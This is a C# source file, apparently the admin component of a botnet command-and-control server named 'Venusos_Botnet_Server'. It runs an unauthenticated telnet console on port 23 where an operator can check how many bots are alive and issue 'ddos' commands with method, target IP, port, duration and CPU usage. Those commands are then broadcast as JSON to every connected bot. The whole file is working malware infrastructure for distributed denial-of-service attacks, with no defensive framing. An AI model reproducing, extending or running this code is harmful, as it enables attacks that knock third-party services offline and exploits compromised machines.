using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace Venusos_Botnet_Server
{
    public class AdminsServer
    {
        public static void StartListener()
        {
            while (true)
            {
                TcpListener tcpListener = new TcpListener(Tools.GetLocalIP(), 23);
                tcpListener.Start();

                try
                {
                    byte[] bytes = new byte[256];
                    string data;

                    while (true)
                    {
                        Console.Write("Telnet console is avaiable on {0}:23\n\r", Tools.GetLocalIP());

                        TcpClient tcpClient = tcpListener.AcceptTcpClient();
                        NetworkStream networkStream = tcpClient.GetStream();

                        int i;
                        data = null;


                        networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));


                        while ((i = networkStream.Read(bytes)) != 0)
                        {
                            data = Encoding.ASCII.GetString(bytes, 0, i);
                            BotsServer.tcpClients.RemoveAll(x => !x.Connected);

                            if (data.StartsWith("help"))
                            {
                                networkStream.Write(Encoding.ASCII.GetBytes("Type ddos for help with attacking,\n\rtype ping to ckeck active bots.\n\r"));
                            }
                            else if (data.StartsWith("ping"))
                            {
                                int all, alive;
                                all = alive = 0;
                                foreach (TcpClient bot in BotsServer.tcpClients)
                                {
                                    all++;
                                    if (BotsServer.Ping(bot))
                                    {
                                        alive++;
                                        networkStream.Write(Encoding.ASCII.GetBytes(bot.Client.RemoteEndPoint.AddressFamily + " is alive\n\r"));
                                    }
                                }
                                networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive out of " + all + "\n\r"));
                            }
                            else if (data.StartsWith("ddos"))
                            {
                                if (data.StartsWith("ddos "))
                                {
                                    try
                                    {
                                        Command command = Tools.CreateCommand(data);
                                        foreach (TcpClient bot in BotsServer.tcpClients)
                                        {
                                            BotsServer.Send(bot, JsonSerializer.Serialize(command));
                                        }
                                    }
                                    catch (Exception e)
                                    {
                                        networkStream.Write(Encoding.ASCII.GetBytes(e.Message));
                                    }
                                }
                                else
                                {
                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP] [PORT] [DURATION] [CPU USAGE (%)]\n\r"));
                                }
                            }

                        }

                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception: {0}", e);
                }
                finally
                {
                    tcpListener.Stop();
                }
            }
        }
    }
}